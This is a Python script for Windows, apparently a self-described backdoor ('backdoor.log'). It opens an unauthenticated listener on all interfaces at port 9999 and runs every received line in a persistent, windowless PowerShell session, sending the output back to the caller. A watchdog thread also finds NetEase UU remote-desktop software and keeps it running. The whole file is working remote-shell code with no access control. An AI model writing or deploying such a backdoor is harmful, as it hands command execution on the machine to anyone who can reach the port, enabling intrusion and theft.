import socket
import subprocess
import logging
import threading
import time
import os
import winreg
import signal

# ========== 日志 ==========
LOG_PATH = os.path.join(os.path.dirname(os.path.abspath(__file__)), "backdoor.log")
logging.basicConfig(
    filename=LOG_PATH,
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
    encoding="utf-8"
)

HOST = "0.0.0.0"
PORT = 9999
CHECK_INTERVAL = 600  # 10 分钟检查一次


# ========== 自动查找 UU 主程序（优先 bin 下的） ==========
def find_uu_exe():
    """自动查找 UU 主程序路径，返回 (exe路径, 工作目录)，找不到返回 (None, None)"""
    reg_paths = [
        (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall"),
        (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall"),
        (winreg.HKEY_CURRENT_USER, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall"),
    ]
    for hive, subkey in reg_paths:
        try:
            with winreg.OpenKey(hive, subkey) as key:
                for i in range(winreg.QueryInfoKey(key)[0]):
                    try:
                        sub = winreg.EnumKey(key, i)
                        with winreg.OpenKey(key, sub) as sk:
                            try:
                                disp = winreg.QueryValueEx(sk, "DisplayName")[0]
                            except FileNotFoundError:
                                continue
                            if "UU" in disp or "GameViewer" in disp or "网易" in disp:
                                try:
                                    loc = winreg.QueryValueEx(sk, "InstallLocation")[0]
                                    for candidate in [
                                        os.path.join(loc, "bin", "GameViewer.exe"),
                                        os.path.join(loc, "GameViewer.exe"),
                                    ]:
                                        if os.path.exists(candidate):
                                            return candidate, os.path.dirname(os.path.dirname(candidate))
                                except FileNotFoundError:
                                    pass
                    except OSError:
                        continue
        except FileNotFoundError:
            continue

    scan_roots = [
        r"C:\Program Files\Netease",
        r"C:\Program Files (x86)\Netease",
        r"D:\Netease",
        r"D:\Program Files\Netease",
        r"D:\新建文件夹 (10)",
    ]
    for root in scan_roots:
        if not os.path.isdir(root):
            continue
        for dirpath, _, filenames in os.walk(root):
            if "GameViewer.exe" in filenames:
                bin_exe = os.path.join(dirpath, "bin", "GameViewer.exe")
                if os.path.exists(bin_exe):
                    return bin_exe, dirpath
                exe = os.path.join(dirpath, "GameViewer.exe")
                return exe, dirpath

    return None, None


UU_PROCESS = "GameViewer.exe"
UU_EXE, UU_WORKDIR = find_uu_exe()

if UU_EXE:
    logging.info(f"自动找到 UU 主程序: {UU_EXE}")
    logging.info(f"工作目录: {UU_WORKDIR}")
else:
    logging.warning("没找到 UU 主程序，看门狗将无法拉起")


# ========== UU 保活 ==========
def uu_is_running():
    r = subprocess.run(
        f'tasklist /FI "IMAGENAME eq {UU_PROCESS}"',
        shell=True, capture_output=True,
        text=True, encoding="gbk", errors="ignore"
    )
    return UU_PROCESS.lower() in r.stdout.lower()


def uu_watchdog():
    while True:
        try:
            if not uu_is_running():
                if UU_EXE:
                    logging.info(f"{UU_PROCESS} 不在运行，拉起主程序...")
                    subprocess.Popen(f'"{UU_EXE}"', shell=True, cwd=UU_WORKDIR)
                else:
                    logging.warning(f"{UU_PROCESS} 不在运行，但没找到主程序路径，无法拉起")
            else:
                logging.info(f"{UU_PROCESS} 正常运行")
        except Exception as e:
            logging.error(f"UU 看门狗异常: {e}")
        time.sleep(CHECK_INTERVAL)


# ========== 持久 PowerShell 命令服务 ==========
def start_powershell():
    return subprocess.Popen(
        ["powershell.exe", "-NoLogo", "-NoProfile", "-Command", "-"],
        stdin=subprocess.PIPE,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        text=True,
        encoding="utf-8",
        errors="ignore",
        bufsize=1,
        shell=False,
        creationflags=subprocess.CREATE_NEW_PROCESS_GROUP | subprocess.CREATE_NO_WINDOW
    )


def handle_client(conn, addr):
    logging.info(f"已连接: {addr}")

    proc = start_powershell()
    buffer = b""
    try:
        while True:
            data = conn.recv(4096)
            if not data:
                logging.info(f"客户端断开: {addr}")
                break
            buffer += data
            while b"\n" in buffer:
                line, buffer = buffer.split(b"\n", 1)
                cmd = line.decode("utf-8", errors="ignore").strip()
                if not cmd:
                    continue

                # 中断当前命令：客户端发 Ctrl+C（\x03）
                if cmd == "\x03":
                    logging.info("收到中断信号，尝试结束当前命令...")
                    try:
                        proc.send_signal(signal.CTRL_BREAK_EVENT)
                        conn.sendall("[已发送中断信号]\n".encode("utf-8"))
                    except Exception as e:
                        conn.sendall(f"[中断失败] {e}\n".encode("utf-8"))
                    continue

                # 重建会话：kill
                if cmd.lower() == "kill":
                    logging.info("收到 kill，重建 PowerShell 会话...")
                    try:
                        proc.kill()
                    except Exception:
                        pass
                    proc = start_powershell()
                    conn.sendall("[已重建会话]\n".encode("utf-8"))
                    continue

                if cmd.lower() == "exit":
                    logging.info(f"收到 exit，断开: {addr}")
                    try:
                        proc.stdin.write("exit\n")
                        proc.stdin.flush()
                        proc.wait(timeout=5)
                    except Exception:
                        pass
                    conn.close()
                    return

                logging.info(f"执行命令: {cmd}")

                try:
                    if proc.poll() is not None:
                        logging.warning("PowerShell 进程已退出，重建会话...")
                        proc = start_powershell()
                    proc.stdin.write(cmd + "\n")
                    proc.stdin.write("Write-Output '__DONE__'\n")
                    proc.stdin.flush()
                except Exception as e:
                    logging.error(f"写入失败，重建会话: {e}")
                    try:
                        proc.kill()
                    except Exception:
                        pass
                    proc = start_powershell()
                    conn.sendall("[写入失败，已重建会话，请重发命令]\n".encode("utf-8"))
                    continue

                output_lines = []
                while True:
                    try:
                        out_line = proc.stdout.readline()
                    except Exception as e:
                        output_lines.append(f"[读取失败] {e}")
                        break
                    if not out_line:
                        break
                    if "__DONE__" in out_line:
                        break
                    output_lines.append(out_line.rstrip("\n"))

                result = "\n".join(output_lines)
                if not result.strip():
                    result = "[无输出]"
                conn.sendall((result + "\n").encode("utf-8"))

    except Exception as e:
        logging.error(f"处理异常: {e}")
    finally:
        try:
            proc.stdin.write("exit\n")
            proc.stdin.flush()
            proc.wait(timeout=3)
        except Exception:
            try:
                proc.kill()
            except Exception:
                pass
        try:
            conn.close()
        except Exception:
            pass


def main():
    threading.Thread(target=uu_watchdog, daemon=True).start()

    s = socket.socket()
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind((HOST, PORT))
    s.listen(5)
    logging.info(f"服务启动，监听 {HOST}:{PORT}")
    while True:
        try:
            conn, addr = s.accept()
            t = threading.Thread(target=handle_client, args=(conn, addr), daemon=True)
            t.start()
        except Exception as e:
            logging.error(f"accept 异常: {e}")


if __name__ == "__main__":
    main()
